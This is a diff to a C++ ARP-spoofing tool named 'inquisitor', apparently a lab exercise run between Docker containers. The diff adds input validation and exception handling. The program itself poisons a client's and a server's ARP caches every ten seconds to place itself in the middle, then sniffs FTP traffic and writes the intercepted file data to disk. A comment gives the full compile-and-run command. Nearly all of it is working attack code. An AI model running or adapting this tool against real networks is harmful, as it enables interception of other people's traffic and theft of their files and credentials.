@@ -14,6 +14,7 @@
 #include <chrono>
 #include <iomanip>
 #include <fcntl.h>
+#include <regex>
 
 struct eth_header
 {
@@ -81,11 +82,45 @@ uint8_t local_mac_address[6];
 
 int verbose_flag = 0;
 
+bool isIP(const std::string &str)
+{
+    std::regex ip_pattern(
+        "^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$");
+    return std::regex_match(str, ip_pattern);
+}
+
+bool isMAC(const std::string &str)
+{
+    std::regex mac_pattern(
+        "^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$");
+    return std::regex_match(str, mac_pattern);
+}
+
 void checkArgs(int argc, char **argv)
 {
-    if (argc < 4)
+    if (argc < 5)
     {
         std::cout << "Usage: " << argv[0] << " <IP-src> <MAC-src> <IP-target> <MAC-target>" << std::endl;
+        exit(1);
+    }
+    if (!isIP(argv[1]))
+    {
+        std::cout << "arg 1: Invalid IP address" << std::endl;
+        exit(1);
+    }
+    if (!isMAC(argv[2]))
+    {
+        std::cout << "arg 2: Invalid MAC address" << std::endl;
+        exit(1);
+    }
+    if (!isIP(argv[3]))
+    {
+        std::cout << "arg 3: Invalid IP address" << std::endl;
+        exit(1);
+    }
+    if (!isMAC(argv[4]))
+    {
+        std::cout << "arg 4: Invalid MAC address" << std::endl;
         exit(1);
     }
 }
@@ -111,8 +146,7 @@ int getLocalInfo(const char *iface, uint8_t *ip_address, uint8_t *mac_address)
     }
     else
     {
-        std::cout << "Failed to get local IP address." << std::endl;
-        return -1;
+        throw std::invalid_argument("Cannot get ip address.");
     }
 
     if (ioctl(fd, SIOCGIFHWADDR, &ifr) != -1)
@@ -126,8 +160,7 @@ int getLocalInfo(const char *iface, uint8_t *ip_address, uint8_t *mac_address)
     }
     else
     {
-        std::cout << "Failed to get local MAC address." << std::endl;
-        return -1;
+        throw std::invalid_argument("Cannot get mac address.");
     }
 
     close(fd);
@@ -139,8 +172,7 @@ void convertArgsClient(uint8_t *ip_address_client, uint8_t *mac_address_client, 
     // convert ip client to uint array
     if (inet_pton(AF_INET, ipClient, ip_address_client) <= 0)
     {
-        std::cout << "inet_pton failed" << std::endl;
-        exit(1);
+        throw std::invalid_argument("Invalid IP address");
     }
     else
     {
@@ -166,8 +198,7 @@ void convertArgsServer(uint8_t *ip_address_server, uint8_t *mac_address_server, 
     // convert ip client to uint array
     if (inet_pton(AF_INET, ipServer, ip_address_server) <= 0)
     {
-        std::cout << "inet_pton failed" << std::endl;
-        exit(1);
+        throw std::invalid_argument("Invalid IP address");
     }
     else
     {
@@ -222,8 +253,7 @@ uint8_t *buildPacketARPSpoofing(
 
     if (packet == nullptr)
     {
-        std::cerr << "Impossible de construire le paquet ARP.";
-        exit(1);
+        throw std::invalid_argument("Impossible de construire le paquet ARP.");
     }
     return packet;
 }
@@ -263,24 +293,23 @@ uint8_t *buildPacketARPRestore(
 
     if (packet == nullptr)
     {
-        std::cerr << "Impossible de construire le paquet ARP.";
-        exit(1);
+        throw std::invalid_argument("Impossible de construire le paquet ARP.");
     }
     return packet;
 }
 
-void sendARPSpoofing(uint8_t *packet, pcap_t *handle)
+void sendARPSpoofing(uint8_t *packet, pcap_t *handle, std::string container)
 {
     int test = pcap_sendpacket(handle, packet, sizeof(eth_header) + sizeof(arp_packet));
     if (test != 0)
     {
         std::cerr << "pcap_sendpacket() a échoué.\n";
-        delete[] packet;
-        exit(1);
+        pcap_perror(handle, 0);
+        throw std::invalid_argument("Impossible d'envoyer le paquet ARP.");
     }
     else
     {
-        std::cout << "Spoofing sent\n";
+        std::cout << "Spoofing sent to " << container << std::endl;
     }
 }
 
@@ -318,7 +347,7 @@ void process_packet(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u
             if (fdfile == -1)
             {
                 std::cerr << "Erreur lors de l'ouverture du fichier" << std::endl;
-                exit(1);
+                throw std::invalid_argument("Impossible d'ouvrir le fichier.");
             }
             write(fdfile, data, data_size);
             close(fdfile);
@@ -345,22 +374,20 @@ void captureFtpPackets(pcap_t *handle)
 
     if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1)
     {
-        std::cerr << "Couldn't parse filter " << filter_exp << ": " << pcap_geterr(handle) << std::endl;
-        return;
+        throw std::invalid_argument("Impossible de compiler le filtre.");
     }
     if (pcap_setfilter(handle, &fp) == -1)
     {
-        std::cerr << "Couldn't install filter " << filter_exp << ": " << pcap_geterr(handle) << std::endl;
-        return;
+        throw std::invalid_argument("Impossible d'installer le filtre.");
     }
     pcap_loop(handle, 0, process_packet, nullptr);
 }
 
-void periodicArpSpoofing(pcap_t *handle, uint8_t *packet)
+void periodicArpSpoofing(pcap_t *handle, uint8_t *packet, std::string container)
 {
     while (true)
     {
-        sendARPSpoofing(packet, handle);
+        sendARPSpoofing(packet, handle, container);
         std::this_thread::sleep_for(std::chrono::seconds(10));
     }
 }
@@ -371,13 +398,13 @@ void signalHandler(int signum)
     uint8_t *packetClient = buildPacketARPRestore(ip_address_client, mac_address_client, ip_address_server, mac_address_server, local_ip_address, local_mac_address);
     uint8_t *packetServer = buildPacketARPRestore(ip_address_server, mac_address_server, ip_address_client, mac_address_client, local_ip_address, local_mac_address);
 
-    sendARPSpoofing(packetClient, handle);
-    sendARPSpoofing(packetServer, handle);
+    sendARPSpoofing(packetClient, handle, "client");
+    sendARPSpoofing(packetServer, handle, "server");
 
     exit(signum);
 }
 
-// g++ inquisitor.cpp -o inquisitor -lpcap -lpthread && ./inquisitor 172.19.0.3 02:42:ac:13:00:02 172.19.0.4 02:42:ac:13:00:04
+// g++ inquisitor.cpp -o inquisitor -lpcap -lpthread && ./inquisitor 172.22.0.3 02:42:ac:16:00:03 172.22.0.4 02:42:ac:16:00:04
 int main(int argc, char *argv[])
 {
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -406,35 +433,42 @@ int main(int argc, char *argv[])
     const char *ipServer = argv[optind + 2];
     const char *macServer = argv[optind + 3];
 
-    checkArgs(argc, argv);
-    convertArgsClient(ip_address_client, mac_address_client, ipClient, macClient);
-    convertArgsServer(ip_address_server, mac_address_server, ipServer, macServer);
-    getLocalInfo("eth0", local_ip_address, local_mac_address);
-
-    // Open the session
-    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
-    if (handle == NULL)
+    try
     {
-        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
-        return 2;
+
+        checkArgs(argc, argv);
+        convertArgsClient(ip_address_client, mac_address_client, ipClient, macClient);
+        convertArgsServer(ip_address_server, mac_address_server, ipServer, macServer);
+        getLocalInfo("eth0", local_ip_address, local_mac_address);
+
+        // Open the session
+        handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
+        if (handle == NULL)
+        {
+            fprintf(stderr, "Couldn't open device: %s\n", errbuf);
+            return 2;
+        }
+        else
+        {
+            std::cout << "handle : " << handle << std::endl;
+        }
+
+        packetSpoofingClient = buildPacketARPSpoofing(ip_address_client, mac_address_client, ip_address_server, mac_address_server, local_ip_address, local_mac_address);
+        packetSpoofingServer = buildPacketARPSpoofing(ip_address_server, mac_address_server, ip_address_client, mac_address_client, local_ip_address, local_mac_address);
+        std::thread arp_thread_client(periodicArpSpoofing, handle, packetSpoofingClient, "client");
+        std::thread arp_thread_server(periodicArpSpoofing, handle, packetSpoofingServer, "server");
+        captureFtpPackets(handle);
+
+        arp_thread_client.join();
+        arp_thread_server.join();
+        pcap_close(handle);
+        delete[] packetSpoofingClient;
+        delete[] packetSpoofingServer;
     }
-    else
+    catch (const std::exception &e)
     {
-        std::cout << "handle : " << handle << std::endl;
+        std::cerr << e.what() << '\n';
     }
-
-    packetSpoofingClient = buildPacketARPSpoofing(ip_address_client, mac_address_client, ip_address_server, mac_address_server, local_ip_address, local_mac_address);
-    packetSpoofingServer = buildPacketARPSpoofing(ip_address_server, mac_address_server, ip_address_client, mac_address_client, local_ip_address, local_mac_address);
-    std::thread arp_thread_client(periodicArpSpoofing, handle, packetSpoofingClient);
-    std::thread arp_thread_server(periodicArpSpoofing, handle, packetSpoofingServer);
-
-    captureFtpPackets(handle);
-
-    arp_thread_client.join();
-    arp_thread_server.join();
-    pcap_close(handle);
-    delete[] packetSpoofingClient;
-    delete[] packetSpoofingServer;
 
     return 0;
 }
